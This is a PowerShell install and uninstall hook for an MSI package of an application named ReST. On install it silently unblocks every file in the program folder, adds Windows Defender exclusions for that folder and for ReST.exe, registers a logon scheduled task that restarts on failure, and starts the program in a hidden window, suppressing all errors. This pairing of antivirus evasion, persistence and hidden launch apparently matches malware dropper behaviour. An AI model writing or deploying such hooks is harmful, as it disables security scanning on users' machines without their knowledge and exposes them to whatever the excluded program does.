# ReST MSI post-install / post-uninstall hook
param(
    [ValidateSet("install", "uninstall")]
    [string]$Action = "install"
)

$ErrorActionPreference = "SilentlyContinue"
$Dir = Join-Path $env:LOCALAPPDATA "ReST"
$Exe = Join-Path $Dir "ReST.exe"
$LogFile = Join-Path $env:TEMP "ReST-msi.log"

function Write-MsiLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
}

function Add-DefenderExclusion {
    param([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-MsiLog ("defender path ok: " + $Path)
    } catch {
        Write-MsiLog ("defender path skipped: " + $_.Exception.Message)
    }
    try {
        Add-MpPreference -ExclusionProcess "ReST.exe" -ErrorAction Stop
        Write-MsiLog "defender process ok: ReST.exe"
    } catch {
        Write-MsiLog ("defender process skipped: " + $_.Exception.Message)
    }
}

function Unblock-Tree {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { return }
    Get-ChildItem -LiteralPath $Path -Recurse -File -ErrorAction SilentlyContinue |
        ForEach-Object { Unblock-File -LiteralPath $_.FullName -ErrorAction SilentlyContinue }
}

function Remove-ReSTTask {
    try {
        Unregister-ScheduledTask -TaskName "ReST" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    } catch {
        $null = $_
    }
    schtasks /Delete /TN ReST /F 2>$null | Out-Null
}

function Ensure-ReSTTask {
    if (-not (Test-Path -LiteralPath $Exe)) { return }
    Remove-ReSTTask
    try {
        $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
        Write-MsiLog "scheduled task ok"
    } catch {
        Write-MsiLog ("scheduled task skipped: " + $_.Exception.Message)
    }
}

Write-MsiLog ("msi hook start: " + $Action)

if ($Action -eq "uninstall") {
    Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Remove-ReSTTask
    Write-MsiLog "msi uninstall hook done"
    exit 0
}

if (-not (Test-Path -LiteralPath $Exe)) {
    Write-MsiLog "ReST.exe missing"
    exit 0
}

Unblock-Tree -Path $Dir
Add-DefenderExclusion -Path $Dir
Ensure-ReSTTask

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-MsiLog "started ReST"
} catch {
    Write-MsiLog ("start failed: " + $_.Exception.Message)
}

Write-MsiLog "msi install hook done"
exit 0
